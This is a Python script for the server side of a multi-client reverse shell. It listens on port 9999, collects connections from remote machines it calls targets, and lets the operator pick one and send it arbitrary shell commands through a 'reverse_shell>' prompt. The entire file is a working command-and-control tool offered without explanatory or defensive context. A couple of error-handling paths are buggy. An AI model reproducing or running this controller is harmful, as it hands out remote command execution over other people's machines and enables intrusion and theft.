import socket
import sys
import threading
import time
import os
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]
queue = Queue()
all_connections = []
all_address = []

def create_socket():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print('Socket creation error: '+ str(msg))

def bind_socket():
    try:
        global host
        global port
        global s
        global server_ready
        print('Binding the port '+ str(port))
        s.bind((host,port))
        s.listen(5)
        server_ready.set()
    except socket.error as msg:
        print('Socket binding error: '+ str(msg) + '\n' + 'Retrying ...')
        bind_socket()

def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn,address = s.accept()
            s.setblocking(1)
            all_connections.append(conn)
            all_address.append(address)
            print('\nConnection has been established: '+address[0] + ':' + str(address[1]))
            print('reverse_shell> ', end = '')
        except:
            print('Error accepting connections')


def list_connections():
    results = ''
    print('------Clients------')
    for i,conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_address[i]
            continue
        results = str(i) + ' ' + str(all_address[i][0]) + ' ' + str(all_address[i][1]) + '\n'
        print('\n'+results)

def get_target(cmd):
    try:
        target = cmd.replace('select ','')
        target = int(target)
        conn = all_connections[target]
        print('You are now connected to: '+str(all_address[target][0]) + ':' + str(all_address[target][1]))
        print('('+str(all_address[target][0])+':' + str(all_address[target][1]) +')> ',end='')
        ip_port_str = str(all_address[target][0])+':'+str(all_address[target][1])
        return conn,ip_port_str
    except:
        print('Selection not valid')
        return None

def send_commands_to_target(conn,ip_port_str):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd))>0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480),'utf-8')
                path_index = client_response.index('/')
                client_response = client_response[:path_index] + '('+ ip_port_str + ') ' + client_response[path_index:]
                print(client_response,end='')

        except:
            print('Error sending commands to target')


def start_reverse_shell():
    global server_ready
    server_ready.wait()
    while True:
        cmd = input('reverse_shell> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn,ip_port_str = get_target(cmd)
            if conn is not None:
                send_commands_to_target(conn,ip_port_str)
        elif 'quit' in cmd:
            os._exit(0)
        else:
            print('Command not recognized')

def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon=True
        t.start()

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()

def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accept_connections()

        if x == 2:
            start_reverse_shell()
        queue.task_done()

server_ready = threading.Event()
create_workers()
create_jobs()








